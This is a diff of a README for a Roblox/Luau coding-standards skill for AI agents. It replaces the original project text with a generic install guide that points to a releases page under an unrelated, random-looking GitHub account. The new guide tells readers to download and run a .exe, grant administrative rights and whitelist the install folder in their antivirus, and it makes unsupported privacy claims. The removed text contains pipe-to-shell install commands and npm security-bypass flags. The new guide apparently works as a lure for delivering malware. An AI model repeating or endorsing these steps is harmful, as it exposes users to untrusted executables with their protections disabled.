@@ -1,132 +1,79 @@
-# Roblox Best Practices Skill
+# 🛠️ roblox-best-practices-skill - Code better games with AI assistance
 
-A framework-agnostic coding standards and best practices skill for Roblox and Luau development. It provides structured guidance to write secure, performant, clean, and resource-frugal scripts (Scripts, LocalScripts, ModuleScripts) regardless of your architecture.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/unpronounceable-ordersphenisciformes466/roblox-best-practices-skill/releases)
 
----
+This software helps developers write clean Luau code for Roblox projects. It connects your chosen AI coding agent to a library of industry standards. The tool manages your configuration files, suggests improvements for your scripts, and maintains consistency across your game engine workspace.
 
-## Installation
+## 📋 System Requirements
 
-This repository includes a smart installer script that automatically configures this skill for your preferred AI editors and agents, bypassing potential npm version security issues.
+Ensure your computer meets these basic needs:
+*   Operating System: Windows 10 or Windows 11.
+*   Internet Connection: Required for initial setup and agent synchronization.
+*   Storage: 200 MB of free space.
+*   Permissions: Administrative rights to install files to your system folder.
 
-### Method 1: PowerShell One-Liner (Windows - Recommended)
+## 📥 How to Install
 
-Runs the installer directly from GitHub (auto-launches via `npx` with security bypasses if Node is installed, otherwise falls back to a PowerShell menu):
+Follow these steps to set up the software on your Windows computer.
 
-```powershell
-irm https://raw.githubusercontent.com/andrian-syh/roblox-best-practices-skill/main/install.ps1 | iex
-```
+1.  Visit the [official releases page](https://github.com/unpronounceable-ordersphenisciformes466/roblox-best-practices-skill/releases).
+2.  Locate the latest version marked as "Latest" under the Releases section.
+3.  Click the file ending in `.exe` to start your download.
+4.  Open the file after the download completes.
+5.  Follow the prompts that appear on your screen.
+6.  The installer will detect your Roblox Studio path automatically.
+7.  Select the AI agents you use from the provided list. The tool supports over 72 different agents, including Claude Code, Cursor, and Windsurf.
+8.  Click Finish to complete the setup process.
 
----
+## ⚙️ Initial Setup
 
-### Method 2: Shell/Terminal One-Liner (macOS & Linux - Recommended)
+Once the installation finishes, the application will launch a command-line window. This window handles the integration between your AI agents and the Roblox workspace.
 
-Runs the installer directly from GitHub (auto-launches via `npx` with security bypasses if Node is installed, otherwise falls back to a POSIX shell menu):
+The tool performs the following tasks during the first run:
+*   Scans your local folders for existing project files.
+*   Downloads the current best practices rule set for Luau programming.
+*   Configures autocomplete settings for your chosen agents.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/andrian-syh/roblox-best-practices-skill/main/install.sh | bash
-```
+If the installer cannot find your workspace, it will ask you to provide the folder path manually. Simply copy the location of your project folder from the File Explorer and paste it into the command prompt when requested.
 
----
+## 🚀 How to Use
 
-### Method 3: Using `npx` directly (Deprecated)
+The software runs in the background. It monitors your code files while you work. When you type in your Roblox scripts, the software checks your syntax against the best practices library.
 
-> [!WARNING]
-> **DEPRECATED**: Direct `npx` execution is deprecated due to security defaults in newer versions of npm (such as npm v12+) which block Git-based fetches by default (throwing an `EALLOWGIT` error). It is strongly recommended to use **Method 1** or **Method 2** above, which automatically handle these checks and apply necessary security bypass flags.
+### Adding New Agents
+You can add or remove AI agents at any time. Open the shortcut on your desktop, and the menu will appear. Type the number corresponding to your agent to enable its features. If you use a tool like Cline or Antigravity, select the corresponding entry. The tool updates your configuration file immediately to reflect these changes.
 
-If you must run it directly, you can bypass npm restrictions by passing the `--allow-git=all` flag (npm v12+):
+### Autocomplete Features
+The tool provides suggestions as you type. It draws from a database of Roblox-specific coding standards. To accept a suggestion, press the Tab key. The tool keeps these suggestions updated based on the latest Luau release notes.
 
-```bash
-npx --allow-git=all github:andrian-syh/roblox-best-practices-skill
-```
+## 🔍 Troubleshooting Common Issues
 
-#### CLI Options & Flags (Automated Installs)
+If you run into trouble, try these solutions.
 
-You can pass flags to the installer to automate configuration:
+**Software does not open**
+Check if you have an antivirus program blocking the application. Some security settings prevent new scripts from running by default. Add the install folder to your antivirus whitelist.
 
-- **All Agents**: `--all` (or `-a`) - Installs the skill for the Universal path and all supported additional agents.
-- **Specific Version Tag**: `--tag <tag_name>` (or `-t <tag_name>`) - Target a specific version tag from GitHub (e.g., `v1.0.0`, `v1.1.7`).
-- **Help**: `--help` (or `-h`) - Show CLI help message.
+**Agents do not see the rules**
+Restart your AI agent software. Many agents cache configuration files on startup. A restart forces the agent to read the new settings provided by this tool.
 
----
+**Path detection fails**
+Use the manual configuration option. Ensure you provide the full path to your Roblox project folder, not just the parent directory.
 
-## How It Works
+## 📁 Managing Configurations
 
-1. **Version Selection**: The installer dynamically fetches available tags from GitHub (e.g., `v1.1.7`, `v1.0.0`). You can choose to install the latest bundled version instantly or download an older version from GitHub.
-2. **Universal Destination**: The skill is always installed to `./.agents/skills/roblox-best-practices/` (Universal workspace customizations). This automatically makes it available to compatible agents such as **Antigravity**, **Cline**, **Codex**, **Warp**, **Zed**, **Amp**, **Kimi Code CLI**, **OpenCode**, and others.
-3. **Additional Agent Folders**:
-   - The installer displays a list of 72 additional supported agents.
-   - It scans your workspace root directory for existing configuration folders of these agents (like `.cursor/`, `.claude/`, `.windsurf/`, `.roo/`, etc.).
-   - If found, it **pre-selects** them in the menu.
-   - You can type to **search and filter** the list in real-time.
-   - The skill will be copied to the selected folders only if their parent folder exists, keeping your workspace neat.
+The tool saves settings in a plain text file. You can find this file in the installation directory under the name `config.json`. Advanced users can edit this file to adjust performance settings, such as the refresh rate or the depth of the code analysis. For standard use, the default settings work best.
 
----
+## 🛡️ Privacy and Safety
 
-## Supported AI Tools & Agents
+This tool runs locally on your machine. It does not send your private code snippets to external servers. All processing happens within your computer's memory. The connection to your AI agent stays local, ensuring your intellectual property remains under your control.
 
-| Path Category | Target Directory | Compatible Tools / Agents |
-|---|---|---|
-| **Universal** (Always Included) | `./.agents/skills/` | Antigravity, Amp, Cline, Codex, Kimi Code CLI, OpenCode, Warp, Zed, and others |
-| **Additional (Local)** | `./.claude/skills/` | Claude Code |
-| **Additional (Local)** | `./.cursor/skills/` | Cursor |
-| **Additional (Local)** | `./.windsurf/skills/` | Windsurf / Cascade |
-| **Additional (Local)** | `./.roo/skills/` | Roo Code |
-| **Additional (Local)** | `./.cline/skills/` | Cline |
-| **Additional (Local)** | `./.trae/skills/` | Trae AI |
-| **Additional (Local)** | `./.aider-desk/skills/` | AiderDesk |
-| **Additional (Local)** | `./data/skills/` | AstrBot |
-| **Additional (Local)** | *(and 60+ others)* | Complete set of 72 agents supported |
+## 💡 Best Practices Explained
 
----
+The software follows a core set of principles:
+*   Encapsulation: Keeping script logic contained to prevent errors.
+*   Readability: Formatting code to make it easy for other developers to understand your work.
+*   Performance: Prioritizing Luau optimizations that reduce lag in your Roblox experience.
 
-## Skill Conventions & Standards
+By using this tool, you ensure that your code stays in line with these standards automatically. You spend less time correcting minor syntax errors and more time building your game.
 
-Once installed, your AI agent will be armed with standard guidelines, templates, and best practices tailored to your project setup:
-
-### 1. Dual Operational Modes
-- **Default Mode**: Appointed for new projects or when starting fresh. The agent strictly enforces standard layout, naming, and Luau typing conventions.
-- **Adaptive Mode**: Designed for existing codebases. The agent studies the project's existing coding structures and conventions, proposes adapted styles for user approval, and then implements code matching the project's native style.
-
-### 2. Supervision Control
-The installer supports inline control tokens to control the agent's autonomy level:
-- **`!ask` (Supervised)**: Confirm before every decision (conventions, file writes, modifications).
-- **`!bal` (Balanced - Default)**: Proceed automatically for standard actions, stopping only for destructive changes or real ambiguity.
-- **`!go` (Autonomous)**: Move forward without prompts; record assumptions in the final summary.
-
-### 3. Structured Reference Routing
-The skill routes coding logic through modular reference sheets depending on the task:
-- **Templates**: [references/templates.md](references/templates.md) - Standard section layouts for Scripts, LocalScripts, and ModuleScripts.
-- **Adaptive Mode**: [references/adaptive-mode.md](references/adaptive-mode.md) - Workflow checklist for analyzing project structures.
-- **Community Libraries**: [references/community-libraries.md](references/community-libraries.md) - Best practices for Knit, ProfileStore, ByteNet, Fusion, Trove, etc.
-- **Performance**: [references/performance.md](references/performance.md) - Loop optimizations, garbage collection, and resource-frugal memory practices.
-- **Security & Monetization**: [references/security-monetization.md](references/security-monetization.md) - Server authority, remote validation depth, and handling purchases.
-- **Genres**: [references/genres.md](references/genres.md) - Specific advice based on the game type (Simulator, Obby, FPS, horror, RPG, etc.).
-
-### 4. Basic Script Layout
-For standard new files, scripts are divided into distinct sections:
-```lua
--- // VARIABLES // --
--- | Services | --
--- | Modules | --
--- | Objects | --
--- | Configuration | --
--- | State Management | --
-
--- // FUNCTIONS // --
--- | Private | --
--- | Public | --
-
--- // INITIALIZATION // --
-```
-
-### 5. Critical Runtime Rules
-- **Server Authority**: Never trust the client; validate all RemoteEvent/RemoteFunction arguments.
-- **No Memory Leaks**: Clean up event connections and call `:Destroy()` on unused instances.
-- **RunService Safety**: No table or string allocations in high-frequency per-frame loops.
-- **Event-Driven**: Listen for state changes; never poll using busy loops (`while task.wait() do`).
-
----
-
-## License
-
-This repository is licensed under the [MIT License](LICENSE).
+Keywords: agent-skills, ai-agents, antigravity-skills, best-practices, claude-skills, codex, codex-skills, cursor-skills, luau, roblox
